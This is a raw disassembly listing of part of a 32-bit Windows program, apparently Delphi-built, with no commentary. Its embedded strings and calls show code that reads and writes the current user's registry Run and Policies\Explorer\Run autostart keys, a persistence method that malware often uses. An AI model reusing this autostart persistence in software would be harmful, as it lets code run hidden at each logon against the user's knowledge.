  406f94:	74 77                	je     0x40700d
  406f96:	6a 00                	push   $0x0
  406f98:	8d 45 90             	lea    -0x70(%ebp),%eax
  406f9b:	50                   	push   %eax
  406f9c:	a1 e0 d1 40 00       	mov    0x40d1e0,%eax
  406fa1:	8b 00                	mov    (%eax),%eax
  406fa3:	e8 a0 af ff ff       	call   0x401f48
  406fa8:	8b d0                	mov    %eax,%edx
  406faa:	8d 45 8c             	lea    -0x74(%ebp),%eax
  406fad:	e8 fa ac ff ff       	call   0x401cac
  406fb2:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406fb5:	ba cc 70 40 00       	mov    $0x4070cc,%edx
  406fba:	b8 01 00 00 80       	mov    $0x80000001,%eax
  406fbf:	e8 c4 f0 ff ff       	call   0x406088
  406fc4:	8b 45 90             	mov    -0x70(%ebp),%eax
  406fc7:	8b 13                	mov    (%ebx),%edx
  406fc9:	e8 c6 ae ff ff       	call   0x401e94
  406fce:	74 3d                	je     0x40700d
  406fd0:	8b 03                	mov    (%ebx),%eax
  406fd2:	e8 71 af ff ff       	call   0x401f48
  406fd7:	8b d0                	mov    %eax,%edx
  406fd9:	8d 45 88             	lea    -0x78(%ebp),%eax
  406fdc:	e8 cb ac ff ff       	call   0x401cac
  406fe1:	8b 45 88             	mov    -0x78(%ebp),%eax
  406fe4:	50                   	push   %eax
  406fe5:	a1 e0 d1 40 00       	mov    0x40d1e0,%eax
  406fea:	8b 00                	mov    (%eax),%eax
  406fec:	e8 57 af ff ff       	call   0x401f48
  406ff1:	8b d0                	mov    %eax,%edx
  406ff3:	8d 45 84             	lea    -0x7c(%ebp),%eax
  406ff6:	e8 b1 ac ff ff       	call   0x401cac
  406ffb:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  406ffe:	ba cc 70 40 00       	mov    $0x4070cc,%edx
  407003:	b8 01 00 00 80       	mov    $0x80000001,%eax
  407008:	e8 3f ec ff ff       	call   0x405c4c
  40700d:	a1 e4 d1 40 00       	mov    0x40d1e4,%eax
  407012:	83 38 00             	cmpl   $0x0,(%eax)
  407015:	74 2f                	je     0x407046
  407017:	68 fc 70 40 00       	push   $0x4070fc
  40701c:	b2 01                	mov    $0x1,%dl
  40701e:	a1 e8 67 40 00       	mov    0x4067e8,%eax
  407023:	e8 18 f8 ff ff       	call   0x406840
  407028:	50                   	push   %eax
  407029:	8b 03                	mov    (%ebx),%eax
  40702b:	e8 18 af ff ff       	call   0x401f48
  407030:	50                   	push   %eax
  407031:	a1 e4 d1 40 00       	mov    0x40d1e4,%eax
  407036:	8b 00                	mov    (%eax),%eax
  407038:	e8 0b af ff ff       	call   0x401f48
  40703d:	8b d0                	mov    %eax,%edx
  40703f:	59                   	pop    %ecx
  407040:	58                   	pop    %eax
  407041:	e8 96 fa ff ff       	call   0x406adc
  407046:	33 c0                	xor    %eax,%eax
  407048:	5a                   	pop    %edx
  407049:	59                   	pop    %ecx
  40704a:	59                   	pop    %ecx
  40704b:	64 89 10             	mov    %edx,%fs:(%eax)
  40704e:	68 68 70 40 00       	push   $0x407068
  407053:	8d 45 84             	lea    -0x7c(%ebp),%eax
  407056:	ba 1f 00 00 00       	mov    $0x1f,%edx
  40705b:	e8 84 aa ff ff       	call   0x401ae4
  407060:	c3                   	ret
  407061:	e9 a6 a7 ff ff       	jmp    0x40180c
  407066:	eb eb                	jmp    0x407053
  407068:	5f                   	pop    %edi
  407069:	5e                   	pop    %esi
  40706a:	5b                   	pop    %ebx
  40706b:	8b e5                	mov    %ebp,%esp
  40706d:	5d                   	pop    %ebp
  40706e:	c3                   	ret
  40706f:	00 ff                	add    %bh,%bh
  407071:	ff                   	(bad)
  407072:	ff                   	(bad)
  407073:	ff 01                	incl   (%ecx)
  407075:	00 00                	add    %al,(%eax)
  407077:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40707b:	00 ff                	add    %bh,%bh
  40707d:	ff                   	(bad)
  40707e:	ff                   	(bad)
  40707f:	ff                   	(bad)
  407080:	3f                   	aas
  407081:	00 00                	add    %al,(%eax)
  407083:	00 53 6f             	add    %dl,0x6f(%ebx)
  407086:	66 74 77             	data16 je 0x407100
  407089:	61                   	popa
  40708a:	72 65                	jb     0x4070f1
  40708c:	5c                   	pop    %esp
  40708d:	4d                   	dec    %ebp
  40708e:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407095:	74 5c                	je     0x4070f3
  407097:	57                   	push   %edi
  407098:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  40709f:	43                   	inc    %ebx
  4070a0:	75 72                	jne    0x407114
  4070a2:	72 65                	jb     0x407109
  4070a4:	6e                   	outsb  %ds:(%esi),(%dx)
  4070a5:	74 56                	je     0x4070fd
  4070a7:	65 72 73             	gs jb  0x40711d
  4070aa:	69 6f 6e 5c 50 6f 6c 	imul   $0x6c6f505c,0x6e(%edi),%ebp
  4070b1:	69 63 69 65 73 5c 45 	imul   $0x455c7365,0x69(%ebx),%esp
  4070b8:	78 70                	js     0x40712a
  4070ba:	6c                   	insb   (%dx),%es:(%edi)
  4070bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4070bc:	72 65                	jb     0x407123
  4070be:	72 5c                	jb     0x40711c
  4070c0:	52                   	push   %edx
  4070c1:	75 6e                	jne    0x407131
  4070c3:	00 ff                	add    %bh,%bh
  4070c5:	ff                   	(bad)
  4070c6:	ff                   	(bad)
  4070c7:	ff 2d 00 00 00 53    	ljmp   *0x53000000
  4070cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4070ce:	66 74 77             	data16 je 0x407148
  4070d1:	61                   	popa
  4070d2:	72 65                	jb     0x407139
  4070d4:	5c                   	pop    %esp
  4070d5:	4d                   	dec    %ebp
  4070d6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4070dd:	74 5c                	je     0x40713b
  4070df:	57                   	push   %edi
  4070e0:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  4070e7:	43                   	inc    %ebx
  4070e8:	75 72                	jne    0x40715c
  4070ea:	72 65                	jb     0x407151
  4070ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4070ed:	74 56                	je     0x407145
  4070ef:	65 72 73             	gs jb  0x407165
  4070f2:	69 6f 6e 5c 52 75 6e 	imul   $0x6e75525c,0x6e(%edi),%ebp
  4070f9:	00 00                	add    %al,(%eax)
  4070fb:	00 00                	add    %al,(%eax)
  4070fd:	00 00                	add    %al,(%eax)
  4070ff:	00 55 8b             	add    %dl,-0x75(%ebp)
  407102:	ec                   	in     (%dx),%al
  407103:	33 c0                	xor    %eax,%eax
  407105:	55                   	push   %ebp
  407106:	68 25 71 40 00       	push   $0x407125
  40710b:	64 ff 30             	push   %fs:(%eax)
  40710e:	64 89 20             	mov    %esp,%fs:(%eax)
  407111:	ff 05 94 e9 40 00    	incl   0x40e994
  407117:	33 c0                	xor    %eax,%eax
  407119:	5a                   	pop    %edx
  40711a:	59                   	pop    %ecx
  40711b:	59                   	pop    %ecx
  40711c:	64 89 10             	mov    %edx,%fs:(%eax)
  40711f:	68 2c 71 40 00       	push   $0x40712c
  407124:	c3                   	ret
  407125:	e9 e2 a6 ff ff       	jmp    0x40180c
  40712a:	eb f8                	jmp    0x407124
  40712c:	5d                   	pop    %ebp
  40712d:	c3                   	ret
  40712e:	8b c0                	mov    %eax,%eax
  407130:	83 2d 94 e9 40 00 01 	subl   $0x1,0x40e994
  407137:	c3                   	ret
  407138:	55                   	push   %ebp
  407139:	8b ec                	mov    %esp,%ebp
  40713b:	33 c0                	xor    %eax,%eax
  40713d:	55                   	push   %ebp
  40713e:	68 5d 71 40 00       	push   $0x40715d
  407143:	64 ff 30             	push   %fs:(%eax)
  407146:	64 89 20             	mov    %esp,%fs:(%eax)
  407149:	ff 05 98 e9 40 00    	incl   0x40e998
  40714f:	33 c0                	xor    %eax,%eax
  407151:	5a                   	pop    %edx
  407152:	59                   	pop    %ecx
  407153:	59                   	pop    %ecx
  407154:	64 89 10             	mov    %edx,%fs:(%eax)
  407157:	68 64 71 40 00       	push   $0x407164
  40715c:	c3                   	ret
  40715d:	e9 aa a6 ff ff       	jmp    0x40180c
  407162:	eb f8                	jmp    0x40715c
  407164:	5d                   	pop    %ebp
  407165:	c3                   	ret
  407166:	8b c0                	mov    %eax,%eax
  407168:	83 2d 98 e9 40 00 01 	subl   $0x1,0x40e998
  40716f:	c3                   	ret
  407170:	ff 25 e0 02 41 00    	jmp    *0x4102e0
  407176:	8b c0                	mov    %eax,%eax
  407178:	ff 25 dc 02 41 00    	jmp    *0x4102dc
  40717e:	8b c0                	mov    %eax,%eax
  407180:	a9 00 00 00 80       	test   $0x80000000,%eax
  407185:	0f 94 c0             	sete   %al
  407188:	c3                   	ret
  407189:	8d 40 00             	lea    0x0(%eax),%eax
  40718c:	55                   	push   %ebp
  40718d:	8b ec                	mov    %esp,%ebp
  40718f:	33 c0                	xor    %eax,%eax
  407191:	55                   	push   %ebp
  407192:	68 b1 71 40 00       	push   $0x4071b1
  407197:	64 ff 30             	push   %fs:(%eax)
  40719a:	64 89 20             	mov    %esp,%fs:(%eax)
  40719d:	ff 05 9c e9 40 00    	incl   0x40e99c
  4071a3:	33 c0                	xor    %eax,%eax
  4071a5:	5a                   	pop    %edx
  4071a6:	59                   	pop    %ecx
  4071a7:	59                   	pop    %ecx
  4071a8:	64 89 10             	mov    %edx,%fs:(%eax)
  4071ab:	68 b8 71 40 00       	push   $0x4071b8
  4071b0:	c3                   	ret
  4071b1:	e9 56 a6 ff ff       	jmp    0x40180c
  4071b6:	eb f8                	jmp    0x4071b0
  4071b8:	5d                   	pop    %ebp
  4071b9:	c3                   	ret
  4071ba:	8b c0                	mov    %eax,%eax
  4071bc:	83 2d 9c e9 40 00 01 	subl   $0x1,0x40e99c
  4071c3:	c3                   	ret
  4071c4:	55                   	push   %ebp
  4071c5:	8b ec                	mov    %esp,%ebp
  4071c7:	33 c0                	xor    %eax,%eax
  4071c9:	55                   	push   %ebp
  4071ca:	68 e9 71 40 00       	push   $0x4071e9
  4071cf:	64 ff 30             	push   %fs:(%eax)
  4071d2:	64 89 20             	mov    %esp,%fs:(%eax)
  4071d5:	ff 05 a0 e9 40 00    	incl   0x40e9a0
  4071db:	33 c0                	xor    %eax,%eax
  4071dd:	5a                   	pop    %edx
  4071de:	59                   	pop    %ecx
  4071df:	59                   	pop    %ecx
  4071e0:	64 89 10             	mov    %edx,%fs:(%eax)
  4071e3:	68 f0 71 40 00       	push   $0x4071f0
  4071e8:	c3                   	ret
  4071e9:	e9 1e a6 ff ff       	jmp    0x40180c
  4071ee:	eb f8                	jmp    0x4071e8
  4071f0:	5d                   	pop    %ebp
  4071f1:	c3                   	ret
  4071f2:	8b c0                	mov    %eax,%eax
  4071f4:	83 2d a0 e9 40 00 01 	subl   $0x1,0x40e9a0
  4071fb:	c3                   	ret
  4071fc:	ff 25 f0 02 41 00    	jmp    *0x4102f0
  407202:	8b c0                	mov    %eax,%eax
  407204:	ff 25 e8 02 41 00    	jmp    *0x4102e8
  40720a:	8b c0                	mov    %eax,%eax
  40720c:	55                   	push   %ebp
  40720d:	8b ec                	mov    %esp,%ebp
  40720f:	33 c0                	xor    %eax,%eax
  407211:	55                   	push   %ebp
  407212:	68 31 72 40 00       	push   $0x407231
  407217:	64 ff 30             	push   %fs:(%eax)
  40721a:	64 89 20             	mov    %esp,%fs:(%eax)
  40721d:	ff 05 a4 e9 40 00    	incl   0x40e9a4
  407223:	33 c0                	xor    %eax,%eax
  407225:	5a                   	pop    %edx
  407226:	59                   	pop    %ecx
  407227:	59                   	pop    %ecx
  407228:	64 89 10             	mov    %edx,%fs:(%eax)
  40722b:	68 38 72 40 00       	push   $0x407238
  407230:	c3                   	ret
  407231:	e9 d6 a5 ff ff       	jmp    0x40180c
  407236:	eb f8                	jmp    0x407230
  407238:	5d                   	pop    %ebp
  407239:	c3                   	ret
  40723a:	8b c0                	mov    %eax,%eax
  40723c:	83 2d a4 e9 40 00 01 	subl   $0x1,0x40e9a4
  407243:	c3                   	ret
  407244:	55                   	push   %ebp
  407245:	8b ec                	mov    %esp,%ebp
  407247:	83 c4 b8             	add    $0xffffffb8,%esp
  40724a:	53                   	push   %ebx
  40724b:	56                   	push   %esi
  40724c:	57                   	push   %edi
  40724d:	33 db                	xor    %ebx,%ebx
  40724f:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  407252:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407255:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  407258:	8b f1                	mov    %ecx,%esi
  40725a:	8d 7d d0             	lea    -0x30(%ebp),%edi
  40725d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40725e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40725f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407260:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407261:	8b f2                	mov    %edx,%esi
  407263:	8d 7d e0             	lea    -0x20(%ebp),%edi
  407266:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407267:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407268:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407269:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40726a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40726d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407270:	e8 5f be ff ff       	call   0x4030d4
  407275:	8d 75 f4             	lea    -0xc(%ebp),%esi
  407278:	33 c0                	xor    %eax,%eax
  40727a:	55                   	push   %ebp
  40727b:	68 7d 73 40 00       	push   $0x40737d
  407280:	64 ff 30             	push   %fs:(%eax)
  407283:	64 89 20             	mov    %esp,%fs:(%eax)
  407286:	33 c0                	xor    %eax,%eax
  407288:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40728b:	33 c0                	xor    %eax,%eax
  40728d:	89 06                	mov    %eax,(%esi)
  40728f:	c7 45 c0 10 00 00 00 	movl   $0x10,-0x40(%ebp)
  407296:	c7 45 c4 04 00 00 00 	movl   $0x4,-0x3c(%ebp)
  40729d:	33 c0                	xor    %eax,%eax
  40729f:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4072a2:	b8 90 73 40 00       	mov    $0x407390,%eax
  4072a7:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4072aa:	6a 00                	push   $0x0
  4072ac:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4072af:	50                   	push   %eax
  4072b0:	56                   	push   %esi
  4072b1:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4072b4:	50                   	push   %eax
  4072b5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4072b8:	8b 55 0c             	mov    0xc(%ebp),%edx
  4072bb:	e8 1c aa ff ff       	call   0x401cdc
  4072c0:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4072c3:	e8 90 b6 ff ff       	call   0x402958
  4072c8:	50                   	push   %eax
  4072c9:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4072cc:	50                   	push   %eax
  4072cd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4072d0:	50                   	push   %eax
  4072d1:	6a 00                	push   $0x0
  4072d3:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4072d6:	50                   	push   %eax
  4072d7:	8b 00                	mov    (%eax),%eax
  4072d9:	ff 50 44             	call   *0x44(%eax)
  4072dc:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
  4072df:	73 5e                	jae    0x40733f
  4072e1:	8b 06                	mov    (%esi),%eax
  4072e3:	99                   	cltd
  4072e4:	52                   	push   %edx
  4072e5:	50                   	push   %eax
  4072e6:	8b c3                	mov    %ebx,%eax
  4072e8:	33 d2                	xor    %edx,%edx
  4072ea:	03 04 24             	add    (%esp),%eax
  4072ed:	13 54 24 04          	adc    0x4(%esp),%edx
  4072f1:	83 c4 08             	add    $0x8,%esp
  4072f4:	8a 08                	mov    (%eax),%cl
  4072f6:	80 f9 20             	cmp    $0x20,%cl
  4072f9:	72 05                	jb     0x407300
  4072fb:	80 f9 7f             	cmp    $0x7f,%cl
  4072fe:	76 0f                	jbe    0x40730f
  407300:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407303:	ba 9c 73 40 00       	mov    $0x40739c,%edx
  407308:	e8 4b aa ff ff       	call   0x401d58
  40730d:	eb 28                	jmp    0x407337
  40730f:	8b 06                	mov    (%esi),%eax
  407311:	99                   	cltd
  407312:	52                   	push   %edx
  407313:	50                   	push   %eax
  407314:	8b c3                	mov    %ebx,%eax
  407316:	33 d2                	xor    %edx,%edx
  407318:	03 04 24             	add    (%esp),%eax
  40731b:	13 54 24 04          	adc    0x4(%esp),%edx
  40731f:	83 c4 08             	add    $0x8,%esp
  407322:	8a 10                	mov    (%eax),%dl
  407324:	8d 45 b8             	lea    -0x48(%ebp),%eax
  407327:	e8 70 a9 ff ff       	call   0x401c9c
  40732c:	8b 55 b8             	mov    -0x48(%ebp),%edx
  40732f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  407332:	e8 21 aa ff ff       	call   0x401d58
  407337:	83 c3 02             	add    $0x2,%ebx
  40733a:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
  40733d:	72 a2                	jb     0x4072e1
  40733f:	8b 06                	mov    (%esi),%eax
  407341:	50                   	push   %eax
  407342:	e8 bd fe ff ff       	call   0x407204
  407347:	8b 45 08             	mov    0x8(%ebp),%eax
  40734a:	8b 55 f0             	mov    -0x10(%ebp),%edx
  40734d:	e8 c2 a7 ff ff       	call   0x401b14
  407352:	33 c0                	xor    %eax,%eax
  407354:	5a                   	pop    %edx
  407355:	59                   	pop    %ecx
  407356:	59                   	pop    %ecx
  407357:	64 89 10             	mov    %edx,%fs:(%eax)
  40735a:	68 84 73 40 00       	push   $0x407384
  40735f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  407362:	ba 02 00 00 00       	mov    $0x2,%edx
  407367:	e8 78 a7 ff ff       	call   0x401ae4
  40736c:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40736f:	e8 4c a7 ff ff       	call   0x401ac0
  407374:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407377:	e8 e8 bc ff ff       	call   0x403064
  40737c:	c3                   	ret
  40737d:	e9 8a a4 ff ff       	jmp    0x40180c
  407382:	eb db                	jmp    0x40735f
  407384:	5f                   	pop    %edi
  407385:	5e                   	pop    %esi
  407386:	5b                   	pop    %ebx
  407387:	8b e5                	mov    %ebp,%esp
  407389:	5d                   	pop    %ebp
  40738a:	c2 08 00             	ret    $0x8
  40738d:	00 00                	add    %al,(%eax)
  40738f:	00 00                	add    %al,(%eax)
  407391:	00 00                	add    %al,(%eax)
  407393:	00 ff                	add    %bh,%bh
  407395:	ff                   	(bad)
  407396:	ff                   	(bad)
  407397:	ff 01                	incl   (%ecx)
  407399:	00 00                	add    %al,(%eax)
  40739b:	00 2a                	add    %ch,(%edx)
  40739d:	00 00                	add    %al,(%eax)
  40739f:	00 53 56             	add    %dl,0x56(%ebx)
  4073a2:	57                   	push   %edi
  4073a3:	83 c4 dc             	add    $0xffffffdc,%esp
  4073a6:	8b f2                	mov    %edx,%esi
  4073a8:	8d 7c 24 14          	lea    0x14(%esp),%edi
  4073ac:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073ad:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073ae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073af:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073b0:	8b f0                	mov    %eax,%esi
  4073b2:	8d 7c 24 04          	lea    0x4(%esp),%edi
  4073b6:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073b7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073b8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073b9:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4073ba:	8b d9                	mov    %ecx,%ebx
  4073bc:	33 c0                	xor    %eax,%eax
  4073be:	89 04 24             	mov    %eax,(%esp)
  4073c1:	6a 00                	push   $0x0
  4073c3:	8d 44 24 04          	lea    0x4(%esp),%eax
  4073c7:	50                   	push   %eax
  4073c8:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4073cc:	50                   	push   %eax
  4073cd:	8d 44 24 10          	lea    0x10(%esp),%eax
  4073d1:	50                   	push   %eax
  4073d2:	6a 00                	push   $0x0
  4073d4:	a1 ac e9 40 00       	mov    0x40e9ac,%eax
  4073d9:	50                   	push   %eax
  4073da:	8b 00                	mov    (%eax),%eax
  4073dc:	ff 50 28             	call   *0x28(%eax)
  4073df:	8b c3                	mov    %ebx,%eax
  4073e1:	8b 14 24             	mov    (%esp),%edx
  4073e4:	8b 52 04             	mov    0x4(%edx),%edx
  4073e7:	e8 f0 a8 ff ff       	call   0x401cdc
  4073ec:	8b 04 24             	mov    (%esp),%eax
  4073ef:	50                   	push   %eax
  4073f0:	e8 0f fe ff ff       	call   0x407204
  4073f5:	83 c4 24             	add    $0x24,%esp
  4073f8:	5f                   	pop    %edi
  4073f9:	5e                   	pop    %esi
  4073fa:	5b                   	pop    %ebx
  4073fb:	c3                   	ret
  4073fc:	53                   	push   %ebx
  4073fd:	56                   	push   %esi
  4073fe:	57                   	push   %edi
  4073ff:	83 c4 ec             	add    $0xffffffec,%esp
  407402:	8b f0                	mov    %eax,%esi
  407404:	8d 7c 24 04          	lea    0x4(%esp),%edi
  407408:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407409:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40740a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40740b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40740c:	8b da                	mov    %edx,%ebx
  40740e:	33 c0                	xor    %eax,%eax
  407410:	89 04 24             	mov    %eax,(%esp)
  407413:	6a 00                	push   $0x0
  407415:	8d 44 24 04          	lea    0x4(%esp),%eax
  407419:	50                   	push   %eax
  40741a:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40741e:	50                   	push   %eax
  40741f:	6a 00                	push   $0x0
  407421:	a1 ac e9 40 00       	mov    0x40e9ac,%eax
  407426:	50                   	push   %eax
  407427:	8b 00                	mov    (%eax),%eax
  407429:	ff 50 1c             	call   *0x1c(%eax)
  40742c:	8b c3                	mov    %ebx,%eax
  40742e:	8b 14 24             	mov    (%esp),%edx
  407431:	8b 52 04             	mov    0x4(%edx),%edx
  407434:	e8 a3 a8 ff ff       	call   0x401cdc
  407439:	8b 04 24             	mov    (%esp),%eax
  40743c:	50                   	push   %eax
  40743d:	e8 c2 fd ff ff       	call   0x407204
  407442:	83 c4 14             	add    $0x14,%esp
  407445:	5f                   	pop    %edi
  407446:	5e                   	pop    %esi
  407447:	5b                   	pop    %ebx
  407448:	c3                   	ret
  407449:	8d 40 00             	lea    0x0(%eax),%eax
  40744c:	55                   	push   %ebp
  40744d:	8b ec                	mov    %esp,%ebp
  40744f:	83 c4 c8             	add    $0xffffffc8,%esp
  407452:	53                   	push   %ebx
  407453:	56                   	push   %esi
  407454:	57                   	push   %edi
  407455:	33 db                	xor    %ebx,%ebx
  407457:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  40745a:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40745d:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  407460:	8b f1                	mov    %ecx,%esi
  407462:	8d 7d d0             	lea    -0x30(%ebp),%edi
  407465:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407466:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407467:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407468:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407469:	8b f2                	mov    %edx,%esi
  40746b:	8d 7d e0             	lea    -0x20(%ebp),%edi
  40746e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40746f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407470:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407471:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407472:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407475:	8b 5d 08             	mov    0x8(%ebp),%ebx
  407478:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40747b:	e8 54 bc ff ff       	call   0x4030d4
  407480:	8d 75 f4             	lea    -0xc(%ebp),%esi
  407483:	33 c0                	xor    %eax,%eax
  407485:	55                   	push   %ebp
  407486:	68 47 75 40 00       	push   $0x407547
  40748b:	64 ff 30             	push   %fs:(%eax)
  40748e:	64 89 20             	mov    %esp,%fs:(%eax)
  407491:	8b c3                	mov    %ebx,%eax
  407493:	e8 28 a6 ff ff       	call   0x401ac0
  407498:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40749b:	50                   	push   %eax
  40749c:	6a 00                	push   $0x0
  40749e:	8d 45 d0             	lea    -0x30(%ebp),%eax
  4074a1:	50                   	push   %eax
  4074a2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4074a5:	50                   	push   %eax
  4074a6:	6a 00                	push   $0x0
  4074a8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4074ab:	50                   	push   %eax
  4074ac:	8b 00                	mov    (%eax),%eax
  4074ae:	ff 50 54             	call   *0x54(%eax)
  4074b1:	33 c0                	xor    %eax,%eax
  4074b3:	89 06                	mov    %eax,(%esi)
  4074b5:	56                   	push   %esi
  4074b6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4074b9:	50                   	push   %eax
  4074ba:	6a 01                	push   $0x1
  4074bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4074bf:	50                   	push   %eax
  4074c0:	8b 00                	mov    (%eax),%eax
  4074c2:	ff 50 0c             	call   *0xc(%eax)
  4074c5:	83 3e 00             	cmpl   $0x0,(%esi)
  4074c8:	76 4d                	jbe    0x407517
  4074ca:	ff 33                	push   (%ebx)
  4074cc:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4074cf:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4074d2:	e8 05 a8 ff ff       	call   0x401cdc
  4074d7:	ff 75 cc             	push   -0x34(%ebp)
  4074da:	68 60 75 40 00       	push   $0x407560
  4074df:	8b c3                	mov    %ebx,%eax
  4074e1:	ba 03 00 00 00       	mov    $0x3,%edx
  4074e6:	e8 25 a9 ff ff       	call   0x401e10
  4074eb:	ff 33                	push   (%ebx)
  4074ed:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4074f0:	50                   	push   %eax
  4074f1:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4074f4:	50                   	push   %eax
  4074f5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  4074f8:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4074fb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4074fe:	e8 41 fd ff ff       	call   0x407244
  407503:	ff 75 c8             	push   -0x38(%ebp)
  407506:	68 60 75 40 00       	push   $0x407560
  40750b:	8b c3                	mov    %ebx,%eax
  40750d:	ba 03 00 00 00       	mov    $0x3,%edx
  407512:	e8 f9 a8 ff ff       	call   0x401e10
  407517:	83 3e 00             	cmpl   $0x0,(%esi)
  40751a:	75 99                	jne    0x4074b5
  40751c:	33 c0                	xor    %eax,%eax
  40751e:	5a                   	pop    %edx
  40751f:	59                   	pop    %ecx
  407520:	59                   	pop    %ecx
  407521:	64 89 10             	mov    %edx,%fs:(%eax)
  407524:	68 4e 75 40 00       	push   $0x40754e
  407529:	8d 45 c8             	lea    -0x38(%ebp),%eax
  40752c:	ba 02 00 00 00       	mov    $0x2,%edx
  407531:	e8 ae a5 ff ff       	call   0x401ae4
  407536:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407539:	e8 26 bb ff ff       	call   0x403064
  40753e:	8d 45 fc             	lea    -0x4(%ebp),%eax
  407541:	e8 1e bb ff ff       	call   0x403064
  407546:	c3                   	ret
  407547:	e9 c0 a2 ff ff       	jmp    0x40180c
  40754c:	eb db                	jmp    0x407529
  40754e:	5f                   	pop    %edi
  40754f:	5e                   	pop    %esi
  407550:	5b                   	pop    %ebx
  407551:	8b e5                	mov    %ebp,%esp
  407553:	5d                   	pop    %ebp
  407554:	c2 04 00             	ret    $0x4
  407557:	00 ff                	add    %bh,%bh
  407559:	ff                   	(bad)
  40755a:	ff                   	(bad)
  40755b:	ff 02                	incl   (%edx)
  40755d:	00 00                	add    %al,(%eax)
  40755f:	00 0d 0a 00 00 ff    	add    %cl,0xff00000a
  407565:	25 f8 02 41 00       	and    $0x4102f8,%eax
  40756a:	8b c0                	mov    %eax,%eax
  40756c:	53                   	push   %ebx
  40756d:	56                   	push   %esi
  40756e:	51                   	push   %ecx
  40756f:	8b f2                	mov    %edx,%esi
  407571:	8b d8                	mov    %eax,%ebx
  407573:	54                   	push   %esp
  407574:	53                   	push   %ebx
  407575:	e8 ea ff ff ff       	call   0x407564
  40757a:	e8 c1 c1 ff ff       	call   0x403740
  40757f:	8b c6                	mov    %esi,%eax
  407581:	8b 14 24             	mov    (%esp),%edx
  407584:	e8 53 a7 ff ff       	call   0x401cdc
  407589:	8b 04 24             	mov    (%esp),%eax
  40758c:	50                   	push   %eax
  40758d:	e8 72 fc ff ff       	call   0x407204
  407592:	5a                   	pop    %edx
  407593:	5e                   	pop    %esi
  407594:	5b                   	pop    %ebx
  407595:	c3                   	ret
  407596:	8b c0                	mov    %eax,%eax
  407598:	55                   	push   %ebp
  407599:	8b ec                	mov    %esp,%ebp
  40759b:	83 c4 c8             	add    $0xffffffc8,%esp
  40759e:	53                   	push   %ebx
  40759f:	56                   	push   %esi
